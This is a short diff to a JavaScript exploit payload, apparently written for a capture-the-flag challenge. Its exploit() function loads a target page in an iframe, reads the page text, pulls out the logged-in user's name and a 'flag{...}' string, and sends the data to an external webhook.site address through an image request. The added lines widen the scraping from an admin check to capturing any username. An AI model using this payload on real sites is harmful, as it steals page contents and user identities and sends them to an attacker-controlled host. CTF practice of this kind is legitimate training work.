@@ -1,5 +1,5 @@
 <script>
-console.log('v14');
+console.log('v15');
 
 function exploit() {
     var iframe = document.createElement('iframe');
@@ -14,8 +14,9 @@ function exploit() {
             var iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
             var text = iframeDoc.body.innerText;
             
-            if(text.includes('Welcome, admin!')) {
-                new Image().src = "https://webhook.site/bf30006e-dd6b-4685-8545-432615830517?admin_detected";
+            if(text.includes('Welcome')) {
+                var name = text.match(/Welcome,\s*([^!]+)!/);
+                new Image().src = "https://webhook.site/bf30006e-dd6b-4685-8545-432615830517?name=" + name[1];
                 
                 var flagMatch = text.match(/flag{[^}]+}/);
                 if(flagMatch) {
